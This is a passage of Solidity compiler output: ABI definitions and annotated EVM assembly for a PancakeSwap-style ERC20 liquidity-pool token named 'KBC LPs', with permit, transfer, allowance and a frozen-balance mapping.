							"constant": false,
							"inputs": [
								{
									"internalType": "address",
									"name": "owner",
									"type": "address"
								},
								{
									"internalType": "address",
									"name": "spender",
									"type": "address"
								},
								{
									"internalType": "uint256",
									"name": "value",
									"type": "uint256"
								},
								{
									"internalType": "uint256",
									"name": "deadline",
									"type": "uint256"
								},
								{
									"internalType": "uint8",
									"name": "v",
									"type": "uint8"
								},
								{
									"internalType": "bytes32",
									"name": "r",
									"type": "bytes32"
								},
								{
									"internalType": "bytes32",
									"name": "s",
									"type": "bytes32"
								}
							],
							"name": "permit",
							"outputs": [],
							"payable": false,
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"constant": true,
							"inputs": [],
							"name": "symbol",
							"outputs": [
								{
									"internalType": "string",
									"name": "",
									"type": "string"
								}
							],
							"payable": false,
							"stateMutability": "view",
							"type": "function"
						},
						{
							"constant": true,
							"inputs": [],
							"name": "totalSupply",
							"outputs": [
								{
									"internalType": "uint256",
									"name": "",
									"type": "uint256"
								}
							],
							"payable": false,
							"stateMutability": "view",
							"type": "function"
						},
						{
							"constant": false,
							"inputs": [
								{
									"internalType": "address",
									"name": "to",
									"type": "address"
								},
								{
									"internalType": "uint256",
									"name": "value",
									"type": "uint256"
								}
							],
							"name": "transfer",
							"outputs": [
								{
									"internalType": "bool",
									"name": "",
									"type": "bool"
								}
							],
							"payable": false,
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"constant": false,
							"inputs": [
								{
									"internalType": "address",
									"name": "from",
									"type": "address"
								},
								{
									"internalType": "address",
									"name": "to",
									"type": "address"
								},
								{
									"internalType": "uint256",
									"name": "value",
									"type": "uint256"
								}
							],
							"name": "transferFrom",
							"outputs": [
								{
									"internalType": "bool",
									"name": "",
									"type": "bool"
								}
							],
							"payable": false,
							"stateMutability": "nonpayable",
							"type": "function"
						}
					],
					"devdoc": {
						"methods": {}
					},
					"evm": {
						"assembly": "    /* \"ERC20.sol\":111:4441  contract ERC20 is IERC20 {... */\n  mstore(0x40, 0x80)\n    /* \"ERC20.sol\":1017:1502  constructor() public {... */\n  callvalue\n    /* \"--CODEGEN--\":8:17   */\n  dup1\n    /* \"--CODEGEN--\":5:7   */\n  iszero\n  tag_1\n  jumpi\n    /* \"--CODEGEN--\":30:31   */\n  0x00\n    /* \"--CODEGEN--\":27:28   */\n  dup1\n    /* \"--CODEGEN--\":20:32   */\n  revert\n    /* \"--CODEGEN--\":5:7   */\ntag_1:\n  pop\n    /* \"ERC20.sol\":1203:1336  keccak256(... */\n  mload(0x40)\n    /* \"ERC20.sol\":1107:1114  chainid */\n  chainid\n  swap1\n    /* \"ERC20.sol\":1203:1336  keccak256(... */\n  dup1\n  0x52\n  data_8b73c3c69bb8fe3d512ecc4cf759cc79239f7b179b0ffacaa9a75d522b39400f\n  dup3\n  codecopy\n  0x40\n  dup1\n  mload\n  swap2\n  dup3\n  swap1\n  sub\n  0x52\n  add\n  dup3\n  keccak256\n    /* \"ERC20.sol\":1370:1374  name */\n  dup3\n  dup3\n  add\n  dup3\n  mstore\n  0x07\n  dup4\n  mstore\n  shl(0xc8, 0x4b4243204c5073)\n  0x20\n  swap4\n  dup5\n  add\n  mstore\n    /* \"ERC20.sol\":1404:1414  bytes(\"1\") */\n  dup2\n  mload\n  dup1\n  dup4\n  add\n  dup4\n  mstore\n  0x01\n  dup2\n  mstore\n  shl(0xf8, 0x31)\n  swap1\n  dup5\n  add\n  mstore\n    /* \"ERC20.sol\":1175:1485  abi.encode(... */\n  dup2\n  mload\n  dup1\n  dup5\n  add\n  swap2\n  swap1\n  swap2\n  mstore\n    /* \"ERC20.sol\":1354:1376  keccak256(bytes(name)) */\n  0x6a36d39f32c2225411d16c8f56813b9117e6eb8bf3d2893c5fc62411565cfcfe\n    /* \"ERC20.sol\":1175:1485  abi.encode(... */\n  dup2\n  dup4\n  add\n  mstore\n    /* \"ERC20.sol\":1394:1415  keccak256(bytes(\"1\")) */\n  0xc89efdaa54c0f20c7adf612882df0950f5a951637e0307cdcb4c672f298b8bc6\n    /* \"ERC20.sol\":1175:1485  abi.encode(... */\n  0x60\n  dup3\n  add\n  mstore\n  0x80\n  dup2\n  add\n  swap5\n  swap1\n  swap5\n  mstore\n    /* \"ERC20.sol\":1466:1470  this */\n  address\n    /* \"ERC20.sol\":1175:1485  abi.encode(... */\n  0xa0\n  dup1\n  dup7\n  add\n  swap2\n  swap1\n  swap2\n  mstore\n  dup2\n  mload\n    /* \"--CODEGEN--\":26:47   */\n  dup1\n  dup7\n  sub\n    /* \"--CODEGEN--\":22:54   */\n  swap1\n  swap2\n  add\n    /* \"--CODEGEN--\":6:55   */\n  dup2\n  mstore\n    /* \"ERC20.sol\":1175:1485  abi.encode(... */\n  0xc0\n  swap1\n  swap5\n  add\n  swap1\n  mstore\n    /* \"ERC20.sol\":1152:1495  keccak256(... */\n  dup3\n  mload\n  swap3\n  add\n  swap2\n  swap1\n  swap2\n  keccak256\n    /* \"ERC20.sol\":1133:1149  DOMAIN_SEPARATOR */\n  0x04\n    /* \"ERC20.sol\":1133:1495  DOMAIN_SEPARATOR = keccak256(... */\n  sstore\n  pop\n    /* \"ERC20.sol\":111:4441  contract ERC20 is IERC20 {... */\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\ndata_8b73c3c69bb8fe3d512ecc4cf759cc79239f7b179b0ffacaa9a75d522b39400f 454950373132446f6d61696e28737472696e67206e616d652c737472696e672076657273696f6e2c75696e7432353620636861696e49642c6164647265737320766572696679696e67436f6e747261637429\n\nsub_0: assembly {\n        /* \"ERC20.sol\":111:4441  contract ERC20 is IERC20 {... */\n      mstore(0x40, 0x80)\n      callvalue\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_1\n      jumpi\n        /* \"--CODEGEN--\":30:31   */\n      0x00\n        /* \"--CODEGEN--\":27:28   */\n      dup1\n        /* \"--CODEGEN--\":20:32   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_1:\n        /* \"ERC20.sol\":111:4441  contract ERC20 is IERC20 {... */\n      pop\n      jumpi(tag_2, lt(calldatasize, 0x04))\n      shr(0xe0, calldataload(0x00))\n      dup1\n      0x47d5d856\n      gt\n      tag_17\n      jumpi\n      dup1\n      0x95d89b41\n      gt\n      tag_18\n      jumpi\n      dup1\n      0x95d89b41\n      eq\n      tag_13\n      jumpi\n      dup1\n      0xa9059cbb\n      eq\n      tag_14\n      jumpi\n      dup1\n      0xd505accf\n      eq\n      tag_15\n      jumpi\n      dup1\n      0xdd62ed3e\n      eq\n      tag_16\n      jumpi\n      jump(tag_2)\n    tag_18:\n      dup1\n      0x47d5d856\n      eq\n      tag_10\n      jumpi\n      dup1\n      0x70a08231\n      eq\n      tag_11\n      jumpi\n      dup1\n      0x7ecebe00\n      eq\n      tag_12\n      jumpi\n      jump(tag_2)\n    tag_17:\n      dup1\n      0x23b872dd\n      gt\n      tag_19\n      jumpi\n      dup1\n      0x23b872dd\n      eq\n      tag_6\n      jumpi\n      dup1\n      0x30adf81f\n      eq\n      tag_7\n      jumpi\n      dup1\n      0x313ce567\n      eq\n      tag_8\n      jumpi\n      dup1\n      0x3644e515\n      eq\n      tag_9\n      jumpi\n      jump(tag_2)\n    tag_19:\n      dup1\n      0x06fdde03\n      eq\n      tag_3\n      jumpi\n      dup1\n      0x095ea7b3\n      eq\n      tag_4\n      jumpi\n      dup1\n      0x18160ddd\n      eq\n      tag_5\n      jumpi\n    tag_2:\n      0x00\n      dup1\n      revert\n        /* \"ERC20.sol\":175:214  string public constant name = \"KBC LPs\" */\n    tag_3:\n      tag_20\n      tag_21\n      jump\t// in\n    tag_20:\n      0x40\n      dup1\n      mload\n      0x20\n      dup1\n      dup3\n      mstore\n      dup4\n      mload\n      dup2\n      dup4\n      add\n      mstore\n      dup4\n      mload\n      swap2\n      swap3\n      dup4\n      swap3\n      swap1\n      dup4\n      add\n      swap2\n      dup6\n      add\n      swap1\n      dup1\n      dup4\n      dup4\n      0x00\n        /* \"--CODEGEN--\":8:108   */\n    tag_22:\n        /* \"--CODEGEN--\":33:36   */\n      dup4\n        /* \"--CODEGEN--\":30:31   */\n      dup2\n        /* \"--CODEGEN--\":27:37   */\n      lt\n        /* \"--CODEGEN--\":8:108   */\n      iszero\n      tag_24\n      jumpi\n        /* \"--CODEGEN--\":90:101   */\n      dup2\n      dup2\n      add\n        /* \"--CODEGEN--\":84:102   */\n      mload\n        /* \"--CODEGEN--\":71:82   */\n      dup4\n      dup3\n      add\n        /* \"--CODEGEN--\":64:103   */\n      mstore\n        /* \"--CODEGEN--\":52:54   */\n      0x20\n        /* \"--CODEGEN--\":45:55   */\n      add\n        /* \"--CODEGEN--\":8:108   */\n      jump(tag_22)\n    tag_24:\n        /* \"--CODEGEN--\":12:26   */\n      pop\n        /* \"ERC20.sol\":175:214  string public constant name = \"KBC LPs\" */\n      pop\n      pop\n      pop\n      swap1\n      pop\n      swap1\n      dup2\n      add\n      swap1\n      0x1f\n      and\n      dup1\n      iszero\n      tag_25\n      jumpi\n      dup1\n      dup3\n      sub\n      dup1\n      mload\n      0x01\n      dup4\n      0x20\n      sub\n      0x0100\n      exp\n      sub\n      not\n      and\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n    tag_25:\n      pop\n      swap3\n      pop\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"ERC20.sol\":2810:2957  function approve(address spender, uint256 value) external returns (bool) {... */\n    tag_4:\n      tag_26\n      0x04\n      dup1\n      calldatasize\n      sub\n        /* \"--CODEGEN--\":13:15   */\n      0x40\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:16   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_27\n      jumpi\n        /* \"--CODEGEN--\":29:30   */\n      0x00\n        /* \"--CODEGEN--\":26:27   */\n      dup1\n        /* \"--CODEGEN--\":19:31   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_27:\n      pop\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"ERC20.sol\":2810:2957  function approve(address spender, uint256 value) external returns (bool) {... */\n      dup2\n      calldataload\n      and\n      swap1\n      0x20\n      add\n      calldataload\n      tag_28\n      jump\t// in\n    tag_26:\n      0x40\n      dup1\n      mload\n      swap2\n      iszero\n      iszero\n      dup3\n      mstore\n      mload\n      swap1\n      dup2\n      swap1\n      sub\n      0x20\n      add\n      swap1\n      return\n        /* \"ERC20.sol\":307:333  uint256 public totalSupply */\n    tag_5:\n      tag_29\n      tag_30\n      jump\t// in\n    tag_29:\n      0x40\n      dup1\n      mload\n      swap2\n      dup3\n      mstore\n      mload\n      swap1\n      dup2\n      swap1\n      sub\n      0x20\n      add\n      swap1\n      return\n        /* \"ERC20.sol\":3108:3469  function transferFrom(... */\n    tag_6:\n      tag_26\n      0x04\n      dup1\n      calldatasize\n      sub\n        /* \"--CODEGEN--\":13:15   */\n      0x60\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:16   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_32\n      jumpi\n        /* \"--CODEGEN--\":29:30   */\n      0x00\n        /* \"--CODEGEN--\":26:27   */\n      dup1\n        /* \"--CODEGEN--\":19:31   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_32:\n      pop\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"ERC20.sol\":3108:3469  function transferFrom(... */\n      dup2\n      calldataload\n      dup2\n      and\n      swap2\n      0x20\n      dup2\n      add\n      calldataload\n      swap1\n      swap2\n      and\n      swap1\n      0x40\n      add\n      calldataload\n      tag_33\n      jump\t// in\n        /* \"ERC20.sol\":656:772  bytes32 public constant PERMIT_TYPEHASH =... */\n    tag_7:\n      tag_29\n      tag_35\n      jump\t// in\n        /* \"ERC20.sol\":266:301  uint8 public constant decimals = 18 */\n    tag_8:\n      tag_36\n      tag_37\n      jump\t// in\n    tag_36:\n      0x40\n      dup1\n      mload\n      0xff\n      swap1\n      swap3\n      and\n      dup3\n      mstore\n      mload\n      swap1\n      dup2\n      swap1\n      sub\n      0x20\n      add\n      swap1\n      return\n        /* \"ERC20.sol\":515:546  bytes32 public DOMAIN_SEPARATOR */\n    tag_9:\n      tag_29\n      tag_39\n      jump\t// in\n        /* \"ERC20.sol\":459:508  mapping(address => uint256) public _frozenBalance */\n    tag_10:\n      tag_29\n      0x04\n      dup1\n      calldatasize\n      sub\n        /* \"--CODEGEN--\":13:15   */\n      0x20\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:16   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_41\n      jumpi\n        /* \"--CODEGEN--\":29:30   */\n      0x00\n        /* \"--CODEGEN--\":26:27   */\n      dup1\n        /* \"--CODEGEN--\":19:31   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_41:\n      pop\n        /* \"ERC20.sol\":459:508  mapping(address => uint256) public _frozenBalance */\n      calldataload\n      sub(shl(0xa0, 0x01), 0x01)\n      and\n      tag_42\n      jump\t// in\n        /* \"ERC20.sol\":339:383  mapping(address => uint256) public balanceOf */\n    tag_11:\n      tag_29\n      0x04\n      dup1\n      calldatasize\n      sub\n        /* \"--CODEGEN--\":13:15   */\n      0x20\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:16   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_44\n      jumpi\n        /* \"--CODEGEN--\":29:30   */\n      0x00\n        /* \"--CODEGEN--\":26:27   */\n      dup1\n        /* \"--CODEGEN--\":19:31   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_44:\n      pop\n        /* \"ERC20.sol\":339:383  mapping(address => uint256) public balanceOf */\n      calldataload\n      sub(shl(0xa0, 0x01), 0x01)\n      and\n      tag_45\n      jump\t// in\n        /* \"ERC20.sol\":778:819  mapping(address => uint256) public nonces */\n    tag_12:\n      tag_29\n      0x04\n      dup1\n      calldatasize\n      sub\n        /* \"--CODEGEN--\":13:15   */\n      0x20\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:16   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_47\n      jumpi\n        /* \"--CODEGEN--\":29:30   */\n      0x00\n        /* \"--CODEGEN--\":26:27   */\n      dup1\n        /* \"--CODEGEN--\":19:31   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_47:\n      pop\n        /* \"ERC20.sol\":778:819  mapping(address => uint256) public nonces */\n      calldataload\n      sub(shl(0xa0, 0x01), 0x01)\n      and\n      tag_48\n      jump\t// in\n        /* \"ERC20.sol\":220:260  string public constant symbol = \"KBC-LP\" */\n    tag_13:\n      tag_20\n      tag_50\n      jump\t// in\n        /* \"ERC20.sol\":2963:3102  function transfer(address to, uint256 value) external returns (bool) {... */\n    tag_14:\n      tag_26\n      0x04\n      dup1\n      calldatasize\n      sub\n        /* \"--CODEGEN--\":13:15   */\n      0x40\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:16   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_56\n      jumpi\n        /* \"--CODEGEN--\":29:30   */\n      0x00\n        /* \"--CODEGEN--\":26:27   */\n      dup1\n        /* \"--CODEGEN--\":19:31   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_56:\n      pop\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"ERC20.sol\":2963:3102  function transfer(address to, uint256 value) external returns (bool) {... */\n      dup2\n      calldataload\n      and\n      swap1\n      0x20\n      add\n      calldataload\n      tag_57\n      jump\t// in\n        /* \"ERC20.sol\":3475:4439  function permit(... */\n    tag_15:\n      tag_58\n      0x04\n      dup1\n      calldatasize\n      sub\n        /* \"--CODEGEN--\":13:16   */\n      0xe0\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:17   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_59\n      jumpi\n        /* \"--CODEGEN--\":30:31   */\n      0x00\n        /* \"--CODEGEN--\":27:28   */\n      dup1\n        /* \"--CODEGEN--\":20:32   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_59:\n      pop\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"ERC20.sol\":3475:4439  function permit(... */\n      dup2\n      calldataload\n      dup2\n      and\n      swap2\n      0x20\n      dup2\n      add\n      calldataload\n      swap1\n      swap2\n      and\n      swap1\n      0x40\n      dup2\n      add\n      calldataload\n      swap1\n      0x60\n      dup2\n      add\n      calldataload\n      swap1\n      0xff\n      0x80\n      dup3\n      add\n      calldataload\n      and\n      swap1\n      0xa0\n      dup2\n      add\n      calldataload\n      swap1\n      0xc0\n      add\n      calldataload\n      tag_60\n      jump\t// in\n    tag_58:\n      stop\n        /* \"ERC20.sol\":389:453  mapping(address => mapping(address => uint256)) public allowance */\n    tag_16:\n      tag_29\n      0x04\n      dup1\n      calldatasize\n      sub\n        /* \"--CODEGEN--\":13:15   */\n      0x40\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:16   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_62\n      jumpi\n        /* \"--CODEGEN--\":29:30   */\n      0x00\n        /* \"--CODEGEN--\":26:27   */\n      dup1\n        /* \"--CODEGEN--\":19:31   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_62:\n      pop\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"ERC20.sol\":389:453  mapping(address => mapping(address => uint256)) public allowance */\n      dup2\n      calldataload\n      dup2\n      and\n      swap2\n      0x20\n      add\n      calldataload\n      and\n      tag_63\n      jump\t// in\n        /* \"ERC20.sol\":175:214  string public constant name = \"KBC LPs\" */\n    tag_21:\n      mload(0x40)\n      dup1\n      0x40\n      add\n      0x40\n      mstore\n      dup1\n      0x07\n      dup2\n      mstore\n      0x20\n      add\n      shl(0xc8, 0x4b4243204c5073)\n      dup2\n      mstore\n      pop\n      dup2\n      jump\t// out\n        /* \"ERC20.sol\":2810:2957  function approve(address spender, uint256 value) external returns (bool) {... */\n    tag_28:\n        /* \"ERC20.sol\":2877:2881  bool */\n      0x00\n        /* \"ERC20.sol\":2893:2929  _approve(msg.sender, spender, value) */\n      tag_65\n        /* \"ERC20.sol\":2902:2912  msg.sender */\n      caller\n        /* \"ERC20.sol\":2914:2921  spender */\n      dup5\n        /* \"ERC20.sol\":2923:2928  value */\n      dup5\n        /* \"ERC20.sol\":2893:2901  _approve */\n      tag_66\n        /* \"ERC20.sol\":2893:2929  _approve(msg.sender, spender, value) */\n      jump\t// in\n    tag_65:\n      pop\n        /* \"ERC20.sol\":2946:2950  true */\n      0x01\n        /* \"ERC20.sol\":2810:2957  function approve(address spender, uint256 value) external returns (bool) {... */\n    tag_64:\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"ERC20.sol\":307:333  uint256 public totalSupply */\n    tag_30:\n      sload(0x00)\n      dup2\n      jump\t// out\n        /* \"ERC20.sol\":3108:3469  function transferFrom(... */\n    tag_33:\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"ERC20.sol\":3239:3254  allowance[from] */\n      dup4\n      and\n        /* \"ERC20.sol\":3219:3223  bool */\n      0x00\n        /* \"ERC20.sol\":3239:3254  allowance[from] */\n      swap1\n      dup2\n      mstore\n        /* \"ERC20.sol\":3239:3248  allowance */\n      0x02\n        /* \"ERC20.sol\":3239:3254  allowance[from] */\n      0x20\n      swap1\n      dup2\n      mstore\n      0x40\n      dup1\n      dup4\n      keccak256\n        /* \"ERC20.sol\":3255:3265  msg.sender */\n      caller\n        /* \"ERC20.sol\":3239:3266  allowance[from][msg.sender] */\n      dup5\n      mstore\n      swap1\n      swap2\n      mstore\n      dup2\n      keccak256\n      sload\n      not(0x00)\n        /* \"ERC20.sol\":3239:3281  allowance[from][msg.sender] != uint256(-1) */\n      eq\n        /* \"ERC20.sol\":3235:3406  if (allowance[from][msg.sender] != uint256(-1)) {... */\n      tag_68\n      jumpi\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"ERC20.sol\":3327:3342  allowance[from] */\n      dup5\n      and\n      0x00\n      swap1\n      dup2\n      mstore\n        /* \"ERC20.sol\":3327:3336  allowance */\n      0x02\n        /* \"ERC20.sol\":3327:3342  allowance[from] */\n      0x20\n      swap1\n      dup2\n      mstore\n      0x40\n      dup1\n      dup4\n      keccak256\n        /* \"ERC20.sol\":3343:3353  msg.sender */\n      caller\n        /* \"ERC20.sol\":3327:3354  allowance[from][msg.sender] */\n      dup5\n      mstore\n      swap1\n      swap2\n      mstore\n      swap1\n      keccak256\n      sload\n        /* \"ERC20.sol\":3327:3395  allowance[from][msg.sender].sub(... */\n      tag_69\n      swap1\n        /* \"ERC20.sol\":3376:3381  value */\n      dup4\n        /* \"ERC20.sol\":3327:3395  allowance[from][msg.sender].sub(... */\n      0xffffffff\n        /* \"ERC20.sol\":3327:3358  allowance[from][msg.sender].sub */\n      tag_70\n        /* \"ERC20.sol\":3327:3395  allowance[from][msg.sender].sub(... */\n      and\n      jump\t// in\n    tag_69:\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"ERC20.sol\":3297:3312  allowance[from] */\n      dup6\n      and\n      0x00\n      swap1\n      dup2\n      mstore\n        /* \"ERC20.sol\":3297:3306  allowance */\n      0x02\n        /* \"ERC20.sol\":3297:3312  allowance[from] */\n      0x20\n      swap1\n      dup2\n      mstore\n      0x40\n      dup1\n      dup4\n      keccak256\n        /* \"ERC20.sol\":3313:3323  msg.sender */\n      caller\n        /* \"ERC20.sol\":3297:3324  allowance[from][msg.sender] */\n      dup5\n      mstore\n      swap1\n      swap2\n      mstore\n      swap1\n      keccak256\n        /* \"ERC20.sol\":3297:3395  allowance[from][msg.sender] = allowance[from][msg.sender].sub(... */\n      sstore\n        /* \"ERC20.sol\":3235:3406  if (allowance[from][msg.sender] != uint256(-1)) {... */\n    tag_68:\n        /* \"ERC20.sol\":3415:3441  _transfer(from, to, value) */\n      tag_71\n        /* \"ERC20.sol\":3425:3429  from */\n      dup5\n        /* \"ERC20.sol\":3431:3433  to */\n      dup5\n        /* \"ERC20.sol\":3435:3440  value */\n      dup5\n        /* \"ERC20.sol\":3415:3424  _transfer */\n      tag_72\n        /* \"ERC20.sol\":3415:3441  _transfer(from, to, value) */\n      jump\t// in\n    tag_71:\n      pop\n        /* \"ERC20.sol\":3458:3462  true */\n      0x01\n        /* \"ERC20.sol\":3108:3469  function transferFrom(... */\n      swap4\n      swap3\n      pop\n      pop\n      pop\n      jump\t// out\n        /* \"ERC20.sol\":656:772  bytes32 public constant PERMIT_TYPEHASH =... */\n    tag_35:\n        /* \"ERC20.sol\":706:772  0x6e71edae12b1b97f4d1f60370fef10105fa2faae0126114a169c64845d6126c9 */\n      0x6e71edae12b1b97f4d1f60370fef10105fa2faae0126114a169c64845d6126c9\n        /* \"ERC20.sol\":656:772  bytes32 public constant PERMIT_TYPEHASH =... */\n      dup2\n      jump\t// out\n        /* \"ERC20.sol\":266:301  uint8 public constant decimals = 18 */\n    tag_37:\n        /* \"ERC20.sol\":299:301  18 */\n      0x12\n        /* \"ERC20.sol\":266:301  uint8 public constant decimals = 18 */\n      dup2\n      jump\t// out\n        /* \"ERC20.sol\":515:546  bytes32 public DOMAIN_SEPARATOR */\n    tag_39:\n      sload(0x04)\n      dup2\n      jump\t// out\n        /* \"ERC20.sol\":459:508  mapping(address => uint256) public _frozenBalance */\n    tag_42:\n      mstore(0x20, 0x03)\n      0x00\n      swap1\n      dup2\n      mstore\n      0x40\n      swap1\n      keccak256\n      sload\n      dup2\n      jump\t// out\n        /* \"ERC20.sol\":339:383  mapping(address => uint256) public balanceOf */\n    tag_45:\n      mstore(0x20, 0x01)\n      0x00\n      swap1\n      dup2\n      mstore\n      0x40\n      swap1\n      keccak256\n      sload\n      dup2\n      jump\t// out\n        /* \"ERC20.sol\":778:819  mapping(address => uint256) public nonces */\n    tag_48:\n      mstore(0x20, 0x05)\n      0x00\n      swap1\n      dup2\n      mstore\n      0x40\n      swap1\n      keccak256\n      sload\n      dup2\n      jump\t// out\n        /* \"ERC20.sol\":220:260  string public constant symbol = \"KBC-LP\" */\n    tag_50:\n      mload(0x40)\n      dup1\n      0x40\n      add\n      0x40\n      mstore\n      dup1\n      0x06\n      dup2\n      mstore\n      0x20\n      add\n      shl(0xd4, 0x04b42432d4c5)\n      dup2\n      mstore\n      pop\n      dup2\n      jump\t// out\n        /* \"ERC20.sol\":2963:3102  function transfer(address to, uint256 value) external returns (bool) {... */\n    tag_57:\n        /* \"ERC20.sol\":3026:3030  bool */\n      0x00\n        /* \"ERC20.sol\":3042:3074  _transfer(msg.sender, to, value) */\n      tag_65\n        /* \"ERC20.sol\":3052:3062  msg.sender */\n      caller\n        /* \"ERC20.sol\":3064:3066  to */\n      dup5\n        /* \"ERC20.sol\":3068:3073  value */\n      dup5\n        /* \"ERC20.sol\":3042:3051  _transfer */\n      tag_72\n        /* \"ERC20.sol\":3042:3074  _transfer(msg.sender, to, value) */\n      jump\t// in\n        /* \"ERC20.sol\":3475:4439  function permit(... */\n    tag_60:\n        /* \"ERC20.sol\":3688:3703  block.timestamp */\n      timestamp\n        /* \"ERC20.sol\":3676:3684  deadline */\n      dup5\n        /* \"ERC20.sol\":3676:3703  deadline >= block.timestamp */\n      lt\n      iszero\n        /* \"ERC20.sol\":3668:3724  require(deadline >= block.timestamp, \"Pancake: EXPIRED\") */\n      tag_76\n      jumpi\n      0x40\n      dup1\n      mload\n      shl(0xe5, 0x461bcd)\n      dup2\n      mstore\n      0x20\n      0x04\n      dup3\n      add\n      mstore\n      0x10\n      0x24\n      dup3\n      add\n      mstore\n      shl(0x82, 0x14185b98d85ad94e8811561412549151)\n      0x44\n      dup3\n      add\n      mstore\n      swap1\n      mload\n      swap1\n      dup2\n      swap1\n      sub\n      0x64\n      add\n      swap1\n      revert\n    tag_76:\n        /* \"ERC20.sol\":3836:3852  DOMAIN_SEPARATOR */\n      sload(0x04)\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"ERC20.sol\":4073:4086  nonces[owner] */\n      dup1\n      dup10\n      and\n        /* \"ERC20.sol\":3734:3748  bytes32 digest */\n      0x00\n        /* \"ERC20.sol\":4073:4086  nonces[owner] */\n      dup2\n      dup2\n      mstore\n        /* \"ERC20.sol\":4073:4079  nonces */\n      0x05\n        /* \"ERC20.sol\":4073:4086  nonces[owner] */\n      0x20\n      swap1\n      dup2\n      mstore\n      0x40\n      dup1\n      dup4\n      keccak256\n        /* \"ERC20.sol\":4073:4088  nonces[owner]++ */\n      dup1\n      sload\n      0x01\n      dup1\n      dup3\n      add\n      swap1\n      swap3\n      sstore\n        /* \"ERC20.sol\":3901:4144  abi.encode(... */\n      dup3\n      mload\n        /* \"ERC20.sol\":706:772  0x6e71edae12b1b97f4d1f60370fef10105fa2faae0126114a169c64845d6126c9 */\n      0x6e71edae12b1b97f4d1f60370fef10105fa2faae0126114a169c64845d6126c9\n        /* \"ERC20.sol\":3901:4144  abi.encode(... */\n      dup2\n      dup7\n      add\n      mstore\n      dup1\n      dup5\n      add\n      swap7\n      swap1\n      swap7\n      mstore\n      swap6\n      dup14\n      and\n      0x60\n      dup7\n      add\n      mstore\n      0x80\n      dup6\n      add\n      dup13\n      swap1\n      mstore\n      0xa0\n      dup6\n      add\n      swap6\n      swap1\n      swap6\n      mstore\n      0xc0\n      dup1\n      dup6\n      add\n      dup12\n      swap1\n      mstore\n      dup2\n      mload\n        /* \"--CODEGEN--\":26:47   */\n      dup1\n      dup7\n      sub\n        /* \"--CODEGEN--\":22:54   */\n      swap1\n      swap2\n      add\n        /* \"--CODEGEN--\":6:55   */\n      dup2\n      mstore\n        /* \"ERC20.sol\":3901:4144  abi.encode(... */\n      0xe0\n      dup6\n      add\n      dup3\n      mstore\n        /* \"ERC20.sol\":3870:4162  keccak256(... */\n      dup1\n      mload\n      swap1\n      dup4\n      add\n      keccak256\n      shl(0xf0, 0x1901)\n        /* \"ERC20.sol\":3774:4176  abi.encodePacked(... */\n      0x0100\n      dup7\n      add\n      mstore\n      0x0102\n      dup6\n      add\n      swap7\n      swap1\n      swap7\n      mstore\n      0x0122\n      dup1\n      dup6\n      add\n      swap7\n      swap1\n      swap7\n      mstore\n      dup1\n      mload\n        /* \"--CODEGEN--\":26:47   */\n      dup1\n      dup6\n      sub\n        /* \"--CODEGEN--\":22:54   */\n      swap1\n      swap7\n      add\n        /* \"--CODEGEN--\":6:55   */\n      dup7\n      mstore\n        /* \"ERC20.sol\":3774:4176  abi.encodePacked(... */\n      0x0142\n      dup5\n      add\n      dup1\n      dup3\n      mstore\n        /* \"ERC20.sol\":3751:4186  keccak256(... */\n      dup7\n      mload\n      swap7\n      dup4\n      add\n      swap7\n      swap1\n      swap7\n      keccak256\n        /* \"ERC20.sol\":4223:4249  ecrecover(digest, v, r, s) */\n      swap6\n      dup4\n      swap1\n      mstore\n      0x0162\n      dup5\n      add\n      dup1\n      dup3\n      mstore\n      dup7\n      swap1\n      mstore\n      0xff\n      dup10\n      and\n      0x0182\n      dup6\n      add\n      mstore\n      0x01a2\n      dup5\n      add\n      dup9\n      swap1\n      mstore\n      0x01c2\n      dup5\n      add\n      dup8\n      swap1\n      mstore\n      mload\n        /* 